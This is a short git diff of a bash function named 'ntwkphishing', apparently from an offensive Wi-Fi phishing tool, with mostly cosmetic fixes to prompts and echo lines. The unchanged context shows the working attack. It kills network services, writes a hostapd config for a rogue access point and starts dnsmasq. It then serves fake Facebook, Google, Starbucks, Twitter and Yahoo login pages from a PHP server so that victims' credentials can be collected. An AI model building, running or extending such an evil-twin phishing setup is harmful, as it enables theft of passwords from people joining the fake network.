@@ -389,7 +389,7 @@ ntwkphishing() {
 	}
 
 	attack() {
-		tput cnorm; echo -ne "${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
+		tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
 		echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
 		tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
 		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
@@ -402,7 +402,7 @@ ntwkphishing() {
 		echo -e "macaddr_acl=0\n" >> hostapd.conf
 		echo -e "auth_algs=1\n" >> hostapd.conf
 		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
-		echo -e "\n$yellowColour[*]$grayColour  Configuring interface $tar"
+		echo -e "\n$yellowColour[*]$grayColour Configuring interface $tar"
 		sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
 		hostapd hostapd.conf > /dev/null 2>&1 &
 		sleep 5
@@ -423,7 +423,8 @@ ntwkphishing() {
 		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 		cd src
 		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi all_in_one)
-		tput cnorm: echo -ne "${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
+		tput cnorm
+		echo -ne "${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo-login, cliqq-payload, optimumwifi): " && read usedlogin
 		check_logins=0; for login in "${logins[@]}"; do
 			if [ "$login" == "$usedlogin" ]; then
 					check_logins=1
@@ -453,7 +454,7 @@ ntwkphishing() {
 				echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
 				popd > /dev/null 2>&1; credentials
 			else
-				tput civis; echo -e "\n${yellowColour}[*]{grayColour} Using custom template..."; sleep 1
+				tput civis; echo -e "\n${yellowColour}[*]${grayColour} Using custom template..."; sleep 1
 				echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
 				pushd $usedlogin > /dev/null 2>&1
 				php -S 192.168.1.1:80 > /dev/null 2>&1 
